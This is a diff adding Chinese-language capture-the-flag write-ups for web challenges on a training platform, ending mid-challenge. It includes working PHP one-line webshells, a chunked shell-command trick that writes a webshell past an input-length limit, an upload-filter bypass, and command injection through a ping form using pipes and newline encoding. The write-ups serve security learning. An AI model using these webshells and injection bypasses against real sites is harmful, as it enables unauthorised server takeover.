@@ -1,6 +1,6 @@
 # 云演Web题库
 
-`更新时间 2024-4-28`
+`更新时间 2024-5-7`
 
 ---
 
@@ -415,7 +415,7 @@ if(strlen($_GET[1])<8){
 ?>
 ```
 
-- 构建一句话木马，首先将生成一句话木马的代码准备好
+- 构建一句话木马，首先将一句话木马的代码准备好
 
 ```php
 <?php echo shell_exec($_GET[1]);
@@ -427,10 +427,108 @@ if(strlen($_GET[1])<8){
 echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWzFdKTs=|base64 -d>a.php
 ```
 
-- 倒序，并分隔为7个字符，并为所有字符添加 `\`
+- 构建payload，使用 `\` 标记特定字符，然后按指定行分隔，每行行头添加 `>` ，行尾添加 `\\` ，排列顺序是从下到上
 
 ```shell
-# php.a>d- 46esab|=sTKdFzWUV0RfRCKjVGel9FbsVGazByboNWZgAHaw9DP ohce
->ph
->p.
+>p
+>a.ph\\
+>-d\>\\
+>64\ \\
+>base\\
+>s=\|\\
+>FdKT\\
+>VUWz\\
+>RfR0\\
+>VjKC\\
+>9leG\\
+>VsbF\\
+>BzaG\\
+>Noby\\
+>AgZW\\
+>9waH\\
+>\ PD\\
+>echo\\
 ```
+
+- 在url栏使用参数1依次传入每行的值，然后使用 `ls -t>0` 来将内容传入0文件，使用 `sh 0` 执行0文件，发现生成a.php
+
+> <img src="./IMG/Screenshot 2024-04-30 123144.png">
+
+访问a.php，现在就能在a.php使用参数1传入任意值，绕过了长度限制
+
+> <img src="./IMG/Screenshot 2024-04-30 123347.png">
+
+# Can you getshell?
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/41`
+
+考点：文件上传，文件包含，一句话木马
+
+- 查看网页源代码，发现upload.php
+
+> <img src="./IMG/Screenshot 2024-05-07 183220.png">
+
+- 进入upload.php，提示上传图片文件，尝试上传php文件，提示上传失败，则上传图片马，上传成功，访问图片马，发现图片马中 `<?php` 和 `?>` 被屏蔽
+
+> <img src="./IMG/Screenshot 2024-05-07 184242.png">
+
+- 换一种马，使用蚁剑连接成功，取得flag
+
+```js
+<script language="php">@eval_r($_POST[admin])</script> 
+```
+
+> <img src="./IMG/Screenshot 2024-05-07 185354.png">
+
+# exec
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/42`
+
+考点：Linux，构造传参，命令执行
+
+- 进入页面，显示the post Parameter is ip，则需要构建一个表单，以POST形式传递一个参数ip到该页面
+
+```html
+<form action="http://3a78c361.clsadp.com/" method="POST">
+    <input name="ip" value="">
+    <input type="submit" value="submit">
+</form>
+```
+
+- 输入127.0.0.1提交，发现是ping
+
+> <img src="./IMG/Screenshot 2024-05-07 191026.png">
+
+- 使用管道符 `|` 查看根目录，在根目录发现flag文件
+
+> <img src="./IMG/Screenshot 2024-05-07 191207.png">
+
+使用 `cat /flag` 获取到flag
+
+> <img src="./IMG/Screenshot 2024-05-07 191304.png">
+
+# ping
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/45`
+
+考点：Linux，命令执行
+
+- 和上一题一样，但是使用GET传值，也就不需要构建网页了，但是该题屏蔽了`;` , `|` , `&` , `||` , `&&` ，只能使用 `%0a`
+
+> <img src="./IMG/Screenshot 2024-05-07 192921.png">
+
+- 进入 `http://ae072d2f.clsadp.com/fL4g_1s_He4r_______` 得到flag
+
+> <img src="./IMG/Screenshot 2024-05-07 193023.png">
+
+# Browser
+
+`https://www.yunyansec.com/#/experiment/ctfdetail/58`
+
+考点：HTTP协议
+
+- 进入网页，提示 You must use [CTF_coffee] to view this page! Other web broswer will be denied!。推测需要更改浏览器UserAgent
+
+> <img src="./IMG/Screenshot 2024-05-07 193556.png">
+
+- 又提示 Go away! Attacker! This page is only for local client!
